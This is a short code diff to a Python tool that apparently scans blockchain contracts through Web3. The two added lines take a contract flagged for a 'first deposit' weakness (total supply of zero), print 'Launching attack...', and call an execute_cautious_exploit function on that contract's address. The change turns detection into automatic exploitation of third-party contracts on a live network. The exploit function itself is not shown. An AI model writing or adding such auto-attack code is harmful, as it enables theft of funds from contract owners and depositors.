@@ -456,6 +456,8 @@ def process_contract(w3: Web3, addr: str) -> None:
                                 "type": "first_deposit_risk",
                                 "data": {"total_supply": 0}
                             })
+                            print(f"[FOUND] First Deposit Risk (TotalSupply=0) in {addr}! Launching attack...", flush=True)
+                            execute_cautious_exploit(w3, addr, "first_deposit_risk", {"total_supply": 0})
                     except Exception:
                         pass
                 
